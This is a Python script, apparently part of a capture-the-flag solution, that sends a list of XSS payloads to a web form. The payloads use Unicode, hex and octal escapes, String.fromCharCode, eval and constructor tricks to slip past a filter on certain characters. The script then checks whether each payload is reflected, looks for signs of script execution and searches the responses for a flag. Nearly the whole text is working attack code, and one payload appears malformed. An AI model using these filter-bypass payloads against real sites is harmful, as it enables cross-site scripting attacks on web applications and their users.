    # Unicode escape sequences
    {
        "technique": "Unicode escape (\uXXXX) for filtered chars",
        "payload": "\"; \u0061l\u0065rt('XS'+'S')//",
        "description": "Using \u0061 for 'a' and \u0065 for 'e'"
    },
    {
        "technique": "Unicode escape - String.fromCharCode",
        "payload": "\"; String.fromCharCode(97,108,101,114,116)('XS'+'S')//",
        "description": "Completely avoid filtered chars using String.fromCharCode"
    },
    {
        "technique": "Unicode escape - full encoding",
        "payload": "\"; \u0061\u006c\u0065\u0072\u0074('XS'+'S')//",
        "description": "Fully encode 'alert' in Unicode"
    },
    
    # Hex escape sequences
    {
        "technique": "Hex escape (\\xXX) for filtered chars",
        "payload": "\"; \x61l\x65rt('XS'+'S')//",
        "description": "Using \x61 for 'a' and \x65 for 'e'"
    },
    {
        "technique": "Hex escape - full encoding",
        "payload": "\"; \x61\x6c\x65\x72\x74('XS'+'S')//",
        "description": "Fully encode 'alert' in hex"
    },
    
    # Octal escape sequences
    {
        "technique": "Octal escape (\\OOO) for filtered chars",
        "payload": "\"; \141l\145rt('XS'+'S')//",
        "description": "Using \141 for 'a' and \145 for 'e'"
    },
    
    # Mixed encoding approaches
    {
        "technique": "Mixed - Unicode + hex",
        "payload": "\"; \u0061\x6c\u0065rt('XS'+'S')//",
        "description": "Mixing Unicode and hex encoding"
    },
    {
        "technique": "Mixed - hex + octal",
        "payload": "\"; \x61\x6c\rt('XS'+'S')//",
        "description": "Mixing hex and octal" 
    },
    
    # Alternate string construction
    {
        "technique": "String.constructor + char codes",
        "payload": "\"; window['constru'+'ctor']('al'+'ert'+'(\\'XS'+'S\\')')()//",
        "description": "Using constructor to build and execute string"
    },
    {
        "technique": "Alternative - eval + char codes",
        "payload": "\"; eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))//",
        "description": "Using eval with String.fromCharCode"
    },
    {
        "technique": "Alternative - []['constru'+'ctor']",
        "payload": "\"; []['constru'+'ctor']('aler'+'t(\\'XS'+'S\\')')()//",
        "description": "Using array constructor"
    }
]

print("Testing encoding techniques to bypass character filters (e,a,c,m,i)")
print("=" * 60)

# Send each test payload
for test in payloads:
    try:
        data = {"name": test["payload"]}
        response = requests.post(f"{base_url}/page", data=data, timeout=10)
        
        print(f"\n[✓] Technique: {test['technique']}")
        print(f"[✓] Payload: {test['payload']}")
        print(f"[✓] Description: {test['description']}")
        print(f"[✓] URL: {response.request.url}")
        print(f"[✓] Method: {response.request.method}")
        print(f"[✓] Status Code: {response.status_code}")
        print(f"[✓] Response Length: {len(response.content)}B")
        
        # Check if payload was reflected
        if test['payload'] in response.text:
            print(f"[✓] Payload reflected in response")
        
        # Print full response to analyze JavaScript execution
        print(f"[✓] Full Response:\n{response.text}")
        
        # Check for JavaScript execution indicators
        exec_indicators = [
            ('XS', 'XS' in response.text),  # Look for XS without S (might indicate script execution)
            ('alert', 'alert' in response.text.lower()),
            ('javascript:', 'javascript:' in response.text.lower()),
            ('onerror', 'onerror' in response.text.lower()),
            ('onload', 'onload' in response.text.lower())
        ]
        
        detected_indicators = [ind for ind, found in exec_indicators if found]
        if detected_indicators:
            print(f"[✓] Indicators found: {detected_indicators}")
        
        # Store result for analysis
        test_results.append({
            "technique": test["technique"],
            "payload": test["payload"],
            "status_code": response.status_code,
            "reflected": test["payload"] in response.text,
            "content_length": len(response.content),
            "indicators": detected_indicators,
            "response_sample": response.text[:200] if len(response.text) > 200 else response.text
        })
        
    except Exception as e:
        print(f"[✗] Error testing {test['technique']}: {str(e)}")
        test_results.append({
            "technique": test["technique"],
            "payload": test["payload"],
            "error": str(e)
        })

print("\n" + "=" * 60)
print("SUMMARY OF TEST RESULTS")
print("=" * 60)

# Analyze and rank results
successful = [r for r in test_results if 'error' not in r and r['reflected'] and r['indicators']]
partial = [r for r in test_results if 'error' not in r and r['reflected']]
failed = [r for r in test_results if 'error' in r]

print(f"\nTotal tests: {len(payloads)}")
print(f"Successful (bypassed filters AND showed execution indicators): {len(successful)}")
print(f"Partial success (bypassed filters): {len(partial) - len(successful)}")
print(f"Failed: {len(failed)}")

if successful:
    print("\n[✓] MOST PROMISING TECHNIQUES (showed execution indicators):")
    for idx, result in enumerate(successful, 1):
        print(f"  {idx}. {result['technique']}")
        print(f"     Payload: {result['payload']}")
        print(f"     Status: {result['status_code']} | Indicators: {result['indicators']}")

if partial:
    print("\n[✓] TECHNIQUES THAT BYPASSED FILTERS (payload reflected):")
    for idx, result in enumerate(partial[:5], 1):
        if result not in successful:
            print(f"  {idx}. {result['technique']} (Status: {result['status_code']})")

if failed:
    print(f"\n[✗] ERRORS ({len(failed)} tests encountered errors)")
    print("  Check error messages above")

# Check for FLAG in any responses
all_responses = " ".join([r.get('response_sample', '') for r in test_results if 'error' not in r])
flag_match = re.search(r'FLAG\{[^}]+\}', all_responses)
if flag_match:
    print(f"\n[!] FLAG FOUND: {flag_match.group(0)}")
else:
    print("\n[✗] No FLAG{} pattern found in responses")

print("\n[✓] Analysis complete. Review individual responses above for detailed JavaScript execution evidence.")
